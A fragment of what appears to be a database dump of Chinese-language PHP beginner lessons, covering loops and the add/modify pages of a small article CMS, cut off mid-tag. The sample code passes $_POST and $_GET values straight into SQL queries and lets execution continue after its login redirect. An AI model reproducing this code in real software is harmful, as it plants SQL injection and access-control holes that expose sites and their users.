class=\"hljs-meta\">&lt;?php</span>\r\n\r\n}\r\n\r\n<span class=\"hljs-meta\">?&gt;</span>\r\n\r\n&lt;/body&gt;\r\n\r\n&lt;/html&gt;</code></pre><p>这段代码中的php部分大部分已经讲解过。这节课我们看一下一个新的内容php中的循环。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-keyword\">while</span>($row = mysql_fetch_assoc($query)){\r\n\r\n \r\n\r\n    $data[]=$row;\r\n\r\n}</code></pre><p>上面的代码通过一个while循环将变量$row的值存储到一个数据$data[]中。</p><p>Php中定义数组直接使用$var[]这种形式即可。至于什么是数组没有学过的学员可以自行查阅网上的资料。Php中循环除了while以外还有其他循环。具体分为：</p><p>while&nbsp;- 只要指定的条件成立，则循环执行代码块</p><p>do...while&nbsp;- 首先执行一次代码块，然后在指定的条件成立时重复这个循环</p><p>for&nbsp;- 循环执行代码块指定的次数</p><p>foreach&nbsp;- 根据数组中每个元素来循环代码块</p><p>下面我们将逐个介绍各个循环的使用逻辑。</p><p>While循环逻辑：</p><p>While先判断指定条件，如果指定条件为真，则执行代码块，接着判断指定条件，直到指定的条件不成立，然后退出！</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-keyword\">while</span> (指定条件) { 要执行的代码块; }</code></pre><p>do……while循环逻辑：</p><p>先执行一次代码块，再判断指定的条件，如果指定条件成立继续执行代码块，接着判断指定条件，直到指定条件不成立退出。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-keyword\">do</span> { 要执行的代码块} <span class=\"hljs-keyword\">while</span> (指定条件);</code></pre><p>For循环逻辑：</p><p>For循环先初始化变量值，然后判断条件，条件成立，执行代码块，执行完以后执行变量自增；接着判断条件，条件成立，执行代码块，变量自增，判断条件，直到条件判断不成立，循环结束。</p><p><br></p><p>for循环实例</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">for</span> ($i=<span class=\"hljs-number\">1</span>; $i&lt;=<span class=\"hljs-number\">5</span>; $i++) { <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"The number is \"</span> . $i . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块 }</span>其他代码块 <span class=\"hljs-meta\">?&gt;</span></code></pre><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">上面的代码执行步骤：\r\n\r\n步骤<span class=\"hljs-number\">1</span>：$i=<span class=\"hljs-number\">1</span>   <span class=\"hljs-comment\">//表示初始换$i的值为1</span>\r\n\r\n步骤<span class=\"hljs-number\">2</span>：$i&lt;=<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">//表示判断，1&lt;=5 成立（真）</span>\r\n\r\n步骤<span class=\"hljs-number\">3</span>：<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"The number is \"</span> . $i . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块</span>\r\n\r\n步骤<span class=\"hljs-number\">4</span>：$i++ <span class=\"hljs-comment\">//表示变量$i的值加1。此时$i的值为2（1+1=2）</span>\r\n\r\n步骤<span class=\"hljs-number\">5</span>：$i&lt;=<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">//表示判断，2&lt;=5 成立（真）</span>\r\n\r\n步骤<span class=\"hljs-number\">6</span>：<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"The number is \"</span> . $i . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块</span>\r\n\r\n步骤<span class=\"hljs-number\">7</span>：$i++ <span class=\"hljs-comment\">//表示变量$i的值加1。此时$i的值为3（2+1=3）</span>\r\n\r\n步骤<span class=\"hljs-number\">8</span>：$i&lt;=<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">//表示判断，3&lt;=5 成立（真）</span>\r\n\r\n步骤<span class=\"hljs-number\">9</span>：<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"The number is \"</span> . $i . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块</span>\r\n\r\n步骤<span class=\"hljs-number\">10</span>：$i++ <span class=\"hljs-comment\">//表示变量$i的值加1。此时$i的值为4（3+1=4）</span>\r\n\r\n步骤<span class=\"hljs-number\">11</span>：$i&lt;=<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">//表示判断，4&lt;=5 成立（真）</span>\r\n\r\n步骤<span class=\"hljs-number\">12</span>：<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"The number is \"</span> . $i . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块</span>\r\n\r\n步骤<span class=\"hljs-number\">13</span>：$i++ <span class=\"hljs-comment\">//表示变量$i的值加1。此时$i的值为5（4+1=5）</span>\r\n\r\n步骤<span class=\"hljs-number\">14</span>：$i&lt;=<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">//表示判断，5&lt;=5 成立（真）</span>\r\n\r\n步骤<span class=\"hljs-number\">15</span>：<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"The number is \"</span> . $i . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块</span>\r\n\r\n步骤<span class=\"hljs-number\">16</span>：$i++ <span class=\"hljs-comment\">//表示变量$i的值加1。此时$i的值为6（5+1=6）</span>\r\n\r\n步骤<span class=\"hljs-number\">14</span>：$i&lt;=<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">//表示判断，6&lt;=5 不成立（假）此时直接退出循环，不在执行代码块。执行for循环外的其他代码块。</span></code></pre><p>Foreach循环逻辑：</p><p>foreach 循环用于遍历数组。每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。直到数组中没有值，循环结束</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-keyword\">foreach</span> ($array <span class=\"hljs-keyword\">as</span> $value) { 要执行代码; }</code></pre><p>foreach循环实例</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-meta\">&lt;?php</span> $x=<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">\"one\"</span>,<span class=\"hljs-string\">\"two\"</span>,<span class=\"hljs-string\">\"three\"</span>); <span class=\"hljs-keyword\">foreach</span> ($x <span class=\"hljs-keyword\">as</span> $val) { <span class=\"hljs-keyword\">echo</span> $val . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块 }其他代码块 <span class=\"hljs-meta\">?&gt;</span></span></code></pre><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">上面的代码执行步骤：\r\n\r\n步骤<span class=\"hljs-number\">1</span>：此时$x为数组，里面有三个值分别为 one tow three\r\n\r\n步骤<span class=\"hljs-number\">2</span>：$x <span class=\"hljs-keyword\">as</span> $val <span class=\"hljs-comment\">//将数据$x中的第一个值 one赋值给变量$val，此时$val的值为one</span>\r\n\r\n步骤<span class=\"hljs-number\">3</span>：<span class=\"hljs-keyword\">echo</span> $val . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块 表示输出这个变量的值 此时输出为 one</span>\r\n\r\n步骤<span class=\"hljs-number\">4</span>：$x <span class=\"hljs-keyword\">as</span> $val <span class=\"hljs-comment\">//将数据$x中的第二个值 tow赋值给变量$val，此时$val的值为tow</span>\r\n\r\n步骤<span class=\"hljs-number\">5</span>：<span class=\"hljs-keyword\">echo</span> $val . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块 表示输出这个变量的值 此时输出为 tow</span>\r\n\r\n步骤<span class=\"hljs-number\">6</span>：$x <span class=\"hljs-keyword\">as</span> $val <span class=\"hljs-comment\">//将数据$x中的第三个值 three赋值给变量$val，此时$val的值为three</span>\r\n\r\n步骤<span class=\"hljs-number\">7</span>：<span class=\"hljs-keyword\">echo</span> $val . <span class=\"hljs-string\">\"&lt;br&gt;\"</span>; <span class=\"hljs-comment\">//代码块 表示输出这个变量的值 此时输出为 three</span></code></pre><p>循环结束，foreach会自动判断数组中没有了元素所以自动结束，执行循环外的其他代码块。</p><p>通过上面的讲解学员应该比较清楚 各种循环的使用了。</p><p>2）注意</p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>8</p>'),(57,'php基础课程九','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）我们接着前面的内容继续。文件结构如下图</span><br></h2><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:148.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p91.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>这节课我们来看article.add.php和article.add.handle.php代码</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:297pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p92.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:6in;height:297pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p93.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:292.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"></v:imagedata></v:shape></p><p>我们通过浏览器访问以下增加文章的连接看看。</p><p>http://******/Codiad/workspace/test/admin/article.add.php</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p94.png\"><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:184.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"></v:imagedata></v:shape></p><p>&nbsp;通过上面的界面就可以增加文章了。</p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:6in;height:205.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p95.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>点击提交就可以增加文章了。然后我们看下管理页面</p><p><v:shape id=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:6in;height:88.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p96.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>发现这个页面出现了文章。因为刚才我们增加了一个文章。我们再看看刚开始写的首页。</p><p><v:shape id=\"_x0000_i1031\" type=\"#_x0000_t75\" style=\"width:6in;height:123.75pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image014.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p97.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:6in;height:123.75pt;\r\n visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p98.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1032\" type=\"#_x0000_t75\" style=\"width:6in;height:132pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image015.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image016.jpg\"></v:imagedata></v:shape></p><p>我们发现文章都已经存在了。</p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:45:26',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/article.add.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\n<span class=\"hljs-keyword\">if</span>($_SESSION[<span class=\"hljs-string\">\'username\'</span>]==<span class=\"hljs-keyword\">null</span>){\r\n\r\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"login error!\"</span>;\r\n\r\nheader(<span class=\"hljs-string\">\"Location: login.php\"</span>);\r\n\r\n}\r\n\r\n<span class=\"hljs-meta\">?&gt;</span>\r\n\r\n \r\n\r\n&lt;!DOCTYPE html&gt;\r\n\r\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\r\n\r\n&lt;head&gt;\r\n\r\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\r\n\r\n    &lt;title&gt;添加文章&lt;/title&gt;\r\n\r\n&lt;/head&gt;\r\n\r\n&lt;body&gt;\r\n\r\n&lt;div style=<span class=\"hljs-string\">\"width:100%; height:1000px; background: ghostwhite;\"</span>&gt;\r\n\r\n \r\n\r\n    &lt;form id=<span class=\"hljs-string\">\"add\"</span> name=<span class=\"hljs-string\">\"add\"</span> method=<span class=\"hljs-string\">\"post\"</span> action=<span class=\"hljs-string\">\"article.add.handle.php\"</span>&gt;\r\n\r\n \r\n\r\n        填写文章名：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"title\"</span> id=<span class=\"hljs-string\">\"title\"</span> value=<span class=\"hljs-string\">\"\"</span>&gt; &lt;br /&gt;\r\n\r\n        填写作者名：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"author\"</span> id=<span class=\"hljs-string\">\"author\"</span> value=<span class=\"hljs-string\">\"\"</span>&gt; &lt;br /&gt;\r\n\r\n        填写文章简介：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"description\"</span> id=<span class=\"hljs-string\">\"description\"</span> value=<span class=\"hljs-string\">\"\"</span>&gt; &lt;br /&gt;\r\n\r\n        填写文章内容：&lt;textarea name=<span class=\"hljs-string\">\"content\"</span> id=<span class=\"hljs-string\">\"content\"</span> cols=<span class=\"hljs-string\">\"30\"</span> rows=<span class=\"hljs-string\">\"10\"</span>&gt;&lt;/textarea&gt; &lt;br /&gt;\r\n\r\n        &lt;!--填写文章添加时间：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"dateline\"</span> id=<span class=\"hljs-string\">\"dateline\"</span> value=<span class=\"hljs-string\">\"\"</span>&gt; &lt;br /&gt;--&gt;\r\n\r\n        &lt;input type=<span class=\"hljs-string\">\"submit\"</span> value=<span class=\"hljs-string\">\"提交\"</span>&gt;\r\n\r\n       \r\n\r\n    &lt;/form&gt;\r\n\r\n \r\n\r\n&lt;/div&gt;\r\n\r\n&lt;/body&gt;\r\n\r\n&lt;/html&gt;</code></pre><p>上面的php代码前面已经全部讲解过，学院这时候应该能看的明白。这个页面的主要功能其实就是一个界面展示也，主要是html部分的代码。学员主要看下下面的代码片段。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">&lt;form id=<span class=\"hljs-string\">\"add\"</span> name=<span class=\"hljs-string\">\"add\"</span> method=<span class=\"hljs-string\">\"post\"</span> action=<span class=\"hljs-string\">\"article.add.handle.php\"</span>&gt;</code></pre><p>一个form表单 以post方式提交数据到article.add.handle.php页面。然后我们就可以想到在article.add.handle.php页面程序会使用$_POST的方式来接收这个地方传过来的参数。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image017.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p99.png\"></p><p>点击提交以后，就会将输入框中的内容提交到article.add.handle.php页面做处理。接下来我们看下article.add.handle.php页面的内容</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/article.add.handle.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\n<span class=\"hljs-keyword\">if</span>($_SESSION[<span class=\"hljs-string\">\'username\'</span>]==<span class=\"hljs-keyword\">null</span>){\r\n\r\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"login error!\"</span>;\r\n\r\nheader(<span class=\"hljs-string\">\"Location: login.php\"</span>);\r\n\r\n}\r\n\r\n \r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'../connect.php\'</span>);\r\n\r\n \r\n\r\n<span class=\"hljs-keyword\">if</span>(!(<span class=\"hljs-keyword\">isset</span>($_POST[<span class=\"hljs-string\">\'title\'</span>])&amp;&amp;!(<span class=\"hljs-keyword\">empty</span>($_POST[<span class=\"hljs-string\">\'title\'</span>])))){\r\n\r\n \r\n\r\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;script&gt;alert(\'标题不能为空\');window.location.href=\'article.add.php\'&lt;/script&gt;\"</span>;\r\n\r\n}<span class=\"hljs-keyword\">else</span>{\r\n\r\n$title = $_POST[<span class=\"hljs-string\">\'title\'</span>];\r\n\r\n$author = $_POST[<span class=\"hljs-string\">\'author\'</span>];\r\n\r\n$description = $_POST[<span class=\"hljs-string\">\'description\'</span>];\r\n\r\n$content = $_POST[<span class=\"hljs-string\">\'content\'</span>];\r\n\r\n$dateline = time();\r\n\r\n$query=mysql_query(<span class=\"hljs-string\">\"insert into article(title,author,description,content,dateline) values(\'$title\',\'$author\',\'$description\',\'$content\',$dateline)\"</span>);\r\n\r\n<span class=\"hljs-comment\">//这里的SQL语句的值要加引号，并不和PHP的语法相关，因为这个语句是MYSQL语句，这里的引号表示内部的值是字符串，如果内部值是数字的话，可加可不加。</span>\r\n\r\n<span class=\"hljs-comment\">//PHP的话，单引号会解释成字符串，双引号会解释成变量。</span>\r\n\r\n<span class=\"hljs-keyword\">if</span>($query){\r\n\r\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;script&gt;alert(\'增加文章成功\');window.location.href=\'article.add.php\'&lt;/script&gt;\"</span>;\r\n\r\n}<span class=\"hljs-keyword\">else</span>{\r\n\r\n \r\n\r\n    <span class=\"hljs-keyword\">echo</span> mysql_errno();\r\n\r\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;script&gt;alert(\'增加文章失败\');window.location.href=\'article.add.php\'&lt;/script&gt;\"</span>;\r\n\r\n}\r\n\r\n}</code></pre><p>学员从代码中可以看到大部分我们都是讲过的。这节课我们说几个没讲过的问题。</p><p>问题一：if(!(isset($_POST[\'title\'])&amp;&amp;!(empty($_POST[\'title\'])))){这段代码中</p><p>感叹号！表示非。就是否定的意思，就是说感叹号前面的如果是真，非真（！真）为假，感叹号前面如果是假，非假（！假）为真。</p><p>问题二：&amp;&amp; 表示and 就是并且的意思 在语句中表示 这个符号前后两端的值都必须为真&nbsp; 整个语句的值才会为真。相对应的还有 || 表示或，就是||这个符号前后两端的值只要有一个为真，整个语句的值就为真。关于php的运算符有很多，具体的可以参考下面的链接学习。</p><p>http://www.w3school.com.cn/php/php_operators.asp</p><p>php运算符学习地址，或者可以自行google搜索php运算符进行学习。</p><p>问题三：empty()函数表示空。整个函数意思是当参数的值为空时，这个函数返回真，否则返回假。具体的大家可以搜索学习一下。后面我们在讲解代码审计的时候也会讲到这个函数的更多有意思的用法。</p><p>2）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>9</p>'),(58,'php基础课程十','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）我们接着前面的内容继续。文件结构如下图</span><br></h2><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:167.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p101.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>这节课我们来看article.modify.php和article.modify.handle.php代码.</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:276.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p102.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>具体代码见课程分析。</p><p>我们通过浏览器访问以下增加文章的连接看看。</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:99pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p103.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:6in;height:99pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p104.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:176.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"></v:imagedata></v:shape></p><p>因为刚才我们修改了一个文章。我们再看看刚开始写的首页。</p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:398.25pt;height:143.25pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p105.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:398.25pt;height:143.25pt;\r\n visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p106.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:6in;height:120pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.jpg\"></v:imagedata></v:shape></p><p>我们发现文章都已经修改了。</p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:45:51',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/article.modify.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\n<span class=\"hljs-keyword\">if</span>($_SESSION[<span class=\"hljs-string\">\'username\'</span>]==<span class=\"hljs-keyword\">null</span>){\r\n\r\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"login error!\"</span>;\r\n\r\nheader(<span class=\"hljs-string\">\"Location: login.php\"</span>);\r\n\r\n}\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'../connect.php\'</span>);\r\n\r\n$id=$_GET[<span class=\"hljs-string\">\'id\'</span>];\r\n\r\n \r\n\r\n$query=mysql_query(<span class=\"hljs-string\">\"select * from article where id=\'$id\'\"</span>);\r\n\r\n \r\n\r\n$data = mysql_fetch_assoc($query);\r\n\r\n \r\n\r\n<span class=\"hljs-meta\">?&gt;</span>\r\n\r\n&lt;!DOCTYPE html&gt;\r\n\r\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\r\n\r\n&lt;head&gt;\r\n\r\n \r\n\r\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\r\n\r\n    &lt;title&gt;修改文章&lt;/title&gt;\r\n\r\n&lt;/head&gt;\r\n\r\n&lt;body&gt;\r\n\r\n&lt;div style=<span class=\"hljs-string\">\"width:100%; height:1000px; background: ghostwhite;\"</span>&gt;\r\n\r\n \r\n\r\n    &lt;form id=<span class=\"hljs-string\">\"add\"</span> name=<span class=\"hljs-string\">\"add\"</span> method=<span class=\"hljs-string\">\"post\"</span> action=<span class=\"hljs-string\">\"article.modify.handle.php\"</span>&gt;\r\n\r\n        &lt;input type=<span class=\"hljs-string\">\"hidden\"</span> name=<span class=\"hljs-string\">\"id\"</span> value=<span 